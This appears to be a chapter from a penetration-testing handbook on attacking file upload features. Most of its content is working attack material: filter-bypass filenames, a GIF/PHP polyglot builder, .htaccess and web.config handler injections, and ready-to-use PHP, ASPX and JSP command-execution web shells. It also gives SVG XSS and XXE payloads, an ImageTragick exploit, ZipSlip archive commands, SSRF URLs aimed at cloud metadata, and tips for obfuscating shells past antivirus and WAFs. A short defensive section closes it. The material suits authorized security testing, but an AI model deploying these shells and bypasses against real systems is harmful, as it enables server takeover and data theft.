# 28 — File Upload Attacks

Turning an upload feature into code execution, file overwrite, XSS, or SSRF. Most upload bugs come from validating one property (extension, MIME, magic bytes) while overlooking another, or from putting the saved file inside a directory the server actually executes.

## Contents

- [What can go wrong](#what-can-go-wrong)
- [Decide what server runs the file](#decide-what-server-runs-the-file)
- [Probe sequence](#probe-sequence)
- [Server-side extension filtering bypasses](#server-side-extension-filtering-bypasses)
- [Content-Type spoofing](#content-type-spoofing)
- [Magic-byte spoofing](#magic-byte-spoofing)
- [`.htaccess` injection (Apache)](#htaccess-injection-apache)
- [`web.config` injection (IIS)](#webconfig-injection-iis)
- [Payloads (web shells)](#payloads-web-shells)
- [SVG → XSS / XXE](#svg-xss-xxe)
- [ImageMagick / ImageTragick](#imagemagick-imagetragick)
- [Path traversal in filename](#path-traversal-in-filename)
- [ZipSlip — archive extraction](#zipslip-archive-extraction)
- [SSRF via "upload from URL"](#ssrf-via-upload-from-url)
- [Detection-aware tactics](#detection-aware-tactics)
- [Verifying success](#verifying-success)
- [Defending (for the report)](#defending-for-the-report)
- [Sources](#sources)

## What can go wrong

| Goal | Achieved when |
|---|---|
| RCE on the server | A server-side script (PHP / JSP / ASPX / etc.) is executed from the upload path |
| Stored XSS | An `.html` / `.svg` / `.xml` lands at a URL the victim opens |
| Path traversal / overwrite | Filename contains `..` and the server uses it raw |
| SSRF | Upload accepts a URL and fetches it server-side |
| Logic abuse | Profile-pic field accepts huge files, ZIP bombs, or differing MIME |
| ZipSlip | Archive entries with `../` paths overwrite files on extract |
| ImageTragick / SVG / XXE | Image processor parses untrusted content |

## Decide what server runs the file

Before payload picking, find the engine:

- `.php` → PHP. Try `.phtml`, `.phar`, `.pht`, `.phps`, `.phps`, `.php3`, `.php4`, `.php5`, `.php7`, `.php8`, `.inc`.
- `.asp`, `.aspx`, `.ashx`, `.asmx`, `.ascx`, `.config` → IIS / ASP.NET.
- `.jsp`, `.jspx`, `.jhtml` → Tomcat / JBoss / WildFly.
- `.cgi`, `.pl` → CGI.
- `.html`, `.htm`, `.svg`, `.xml` → static, but XSS-capable.
- `.htaccess` (Apache), `web.config` (IIS) — config injections.

Confirm by uploading a known-extension test file and visiting it.

## Probe sequence

1. **Upload normally.** Does it succeed? Where does the file land? What is the URL?
2. **Try the obvious server extension** (e.g. `shell.php`).
3. **If blocked by extension** — try aliases (`.phtml`, `.phar`, `.php5`).
4. **Try double extensions** (`shell.php.jpg`, `shell.jpg.php`).
5. **Try null-byte truncation** on old stacks (`shell.php%00.jpg`).
6. **Try MIME spoofing** — change `Content-Type` to `image/png`.
7. **Try magic-byte spoofing** — prepend image header bytes to a PHP file.
8. **Try alternate engines** — `.htaccess` / `web.config` to make the server execute an unusual extension.
9. **Try archive paths** — when the app extracts uploaded ZIPs.
10. **Try metadata abuse** — EXIF comment, SVG embedded `<script>`.

## Server-side extension filtering bypasses

### Extension allowlist with case-insensitive check

```
shell.PHP, shell.PhP, shell.pHp        # case
```

### Blacklist with specific list

```
shell.phtml, shell.phar, shell.pht, shell.phps,
shell.php3, shell.php4, shell.php5, shell.php7
shell.aspx, shell.ashx, shell.asmx, shell.cer
shell.jspx, shell.jhtml
```

### Double / split extensions (server picks last vs first)

```
shell.php.jpg                          # Apache mod_mime: handles both, may still execute as PHP if AddHandler / SetHandler is mis-set
shell.jpg.php                          # whatever-the-last is
shell.php.        .                    # trailing whitespace / dots truncated by some FS
shell.php\x00.jpg                      # null byte (PHP <5.3.4, Java <8u31)
```

### URL trickery on saved name

```
shell.php#.jpg                         # URL fragment
shell.php?.jpg                         # query string
shell.php;.jpg                         # IIS 6 semicolon parsing bug
shell.php%20.jpg                       # trailing space
```

### Apache MultiViews / mod_mime

If `Options +MultiViews` is on, `shell.php` content uploaded as `shell` (no ext) may still be served as PHP if no other match exists.

## Content-Type spoofing

Multipart upload includes a `Content-Type` header per part. Servers that trust it without inspecting bytes are easy:

```
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg            ←— spoof

<?php system($_GET['c']); ?>
```

In Burp Repeater: change the `Content-Type` line and resend.

## Magic-byte spoofing

Defenders often check the first few bytes of the upload to assume "real image". Prepend the magic bytes; the rest of the file can still be code.

```
GIF87a; <?php system($_GET['c']); ?>
GIF89a; <?php system($_GET['c']); ?>
\xff\xd8\xff\xe0...JFIF...<?php ... ?>
\x89PNG\r\n\x1a\n...IHDR...<?php ... ?>
```

Build a polyglot:

```bash
printf 'GIF89a;\n<?php system($_GET["c"]); ?>\n' > shell.php
file shell.php          # → "GIF image data..."
```

If the server checks both magic bytes AND extension, combine: `shell.gif.php` or `shell.php.gif` plus magic header, then `.htaccess` / wrapper trick to force execution.

## `.htaccess` injection (Apache)

Upload a custom `.htaccess` that makes any extension execute as PHP:

```apache
AddType application/x-httpd-php .jpg
```

Then upload `shell.jpg` containing PHP — it executes.

Only works when the upload path allows `.htaccess` and Apache is configured with `AllowOverride FileInfo`.

## `web.config` injection (IIS)

The IIS equivalent. Drop `web.config` into a writable directory:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="x" path="*.x" verb="*"
           modules="IsapiModule" scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
  </system.webServer>
</configuration>
```

Or use `<httpErrors errorMode="Detailed" />` to leak stack traces.

Modern IIS often blocks `web.config` upload directly; try `web.config%00.jpg` / case variations.

## Payloads (web shells)

PHP:

```php
<?php system($_GET['c']); ?>
<?php passthru($_REQUEST['c']); ?>
<?php @eval($_POST['c']); ?>            // POST → less in logs
```

ASPX:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
  var c = Request["c"];
  if (c != null) {
    var p = new ProcessStartInfo("cmd.exe", "/c " + c) {
      RedirectStandardOutput = true, UseShellExecute = false
    };
    var pr = Process.Start(p);
    Response.Write(pr.StandardOutput.ReadToEnd());
  }
%>
```

JSP:

```jsp
<%@ page import="java.util.*,java.io.*" %>
<%
  String c = request.getParameter("c");
  if (c != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",c});
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l; while ((l = r.readLine()) != null) out.println(l);
  }
%>
```

Or pull a real reverse shell from PayloadsAllTheThings; the one-liner web shells are for the first foothold only.

## SVG → XSS / XXE

SVG is XML. If it lands at a URL the victim opens, `<script>` inside it runs.

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(1)</script>
</svg>
```

XXE via SVG (when an XML parser parses the file server-side, e.g. for thumbnailing):

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<svg>&x;</svg>
```

## ImageMagick / ImageTragick

Old `convert` (ImageMagick < 6.9.3-10) parsed embedded MVG / SVG / MSL → RCE (`CVE-2016-3714` and family). Trigger by uploading an image with crafted comment:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/oops.jpg"|id")'
pop graphic-context
```

If the target uses an old ImageMagick and any image processing path runs.

## Path traversal in filename

If the server uses the filename you supply on save:

```
filename="../../../../var/www/html/shell.php"
filename="..\\..\\..\\..\\inetpub\\wwwroot\\shell.aspx"
```

Sometimes blocked at filename-form parsing — try in the `Content-Disposition` raw vs URL-encoded.

## ZipSlip — archive extraction

A ZIP/TAR with an entry like `../../../../etc/cron.d/x` overwrites system paths when extracted naively.

```bash
mkdir slip && cd slip
mkdir -p a/../../../../tmp
echo "PWNED" > a/../../../../tmp/pwn
zip --symlinks slip.zip a/../../../../tmp/pwn
# Many tools store the literal path in the archive; verify with:
unzip -l slip.zip
```

`evilarc` automates well-known ZipSlip path generation:

```bash
python3 evilarc.py -o unix -d 8 -p var/www/html/ shell.php
```

## SSRF via "upload from URL"

If the server accepts a URL and fetches it server-side:

```
url=http://169.254.169.254/latest/meta-data/         # AWS IMDSv1
url=http://localhost:8500/v1/agent/self              # internal Consul
url=file:///etc/passwd                                # if file:// not blocked
url=gopher://...                                       # gopher SSRF for raw protocols
```

See [30 Web Attacks — SSRF](30-web-attacks.md).

## Detection-aware tactics

- Many uploaders lowercase the filename — `.PHP` won't help if it does.
- AV often inspects PHP/ASPX shells. Encode the body (`base64_decode`) or use a less-known function.
- WAFs scan for `<?php system`. Replace with `eval(base64_decode("..."))` or backticks.
- File scanners (ClamAV) flag classic web shells; obfuscate or use a custom shell.

## Verifying success

After uploading, browse to the file. If it executes:

```
GET /uploads/shell.php?c=id            → id output
GET /uploads/shell.aspx?c=whoami       → whoami output
```

If it just downloads as text — extension is right but the directory does not execute (most likely a static-only path). Try moving up a directory (`../shell.php`), or finding a path that does run code (often `/admin/`, `/templates/`, `/themes/`, `/cgi-bin/`).

## Defending (for the report)

- Allowlist by extension and MIME, **and** verify content (server-side image library, MIME from libmagic).
- Re-encode images: load with a hardened library and write back as a fresh PNG/JPEG.
- Save uploads under a path that does not execute code (no PHP handler, no script handlers).
- Generate the saved filename server-side (UUID + safe extension); never trust user-supplied names.
- Strip / disable `.htaccess` overrides and config files in upload directories.
- Use a separate, sandboxed origin for user content (cookieless, distinct domain).
- Limit file size, count, and rate.
- Antivirus + content disarm (ClamAV / commercial CDR) for high-risk endpoints.

## Sources

- OWASP — Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- HackTricks — File Upload: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
- PayloadsAllTheThings — File Upload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- ImageTragick: https://imagetragick.com/
- ZipSlip: https://snyk.io/research/zip-slip-vulnerability
